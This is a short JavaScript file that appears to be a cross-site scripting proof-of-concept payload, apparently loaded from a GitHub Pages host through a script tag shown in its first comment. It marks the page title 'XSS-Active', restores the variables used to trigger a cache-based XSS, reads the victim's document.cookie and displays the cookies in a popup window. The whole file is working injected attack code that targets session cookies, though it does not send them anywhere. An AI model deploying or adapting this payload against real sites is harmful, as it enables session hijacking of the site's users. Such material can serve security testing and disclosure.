//<script src="https://jdl-84.github.io/CACHE-XSS/XSS.js"></script> 
//BEGIN - Update Title for confirmation script loaded
document.title = "XSS-Active"
//Put Back the variable used to invoke the XSS
//Script damaged!
var websession  = '1';
var mysessionno  = '1';
var CurrDT          = new Date();
var TimeAsMS        = CurrDT.getTime();
var LastRefresh = TimeAsMS;
var timeoutlength = 9999000;

//Get Cookie
var UsersCookie = document.cookie;


function createPopup(){
var popup = open("", "", "width=800,height=600,toolbar=0,menubar=0,location=0,scrollbars=0,resizable=0");
popup.document.body.style.background = "rgb(53, 53, 53)";
//Cookie Doc Header
var hCookie = popup.document.createElement("h4");
hCookie.style = "color:fff;";
hCookie.innerHTML = "Document Cookie";
popup.document.body.appendChild(hCookie);
popup.document.title = "XSS Data";
//Cookie Doc
var txtCookie = popup.document.createElement("TEXTAREA");
txtCookie.innerHTML = UsersCookie;
txtCookie.style = "width:100%;height:300px;margin-left:0px;margin-right:0px;background:rgb(79, 79, 79);";
popup.document.body.appendChild(txtCookie);

}
createPopup();
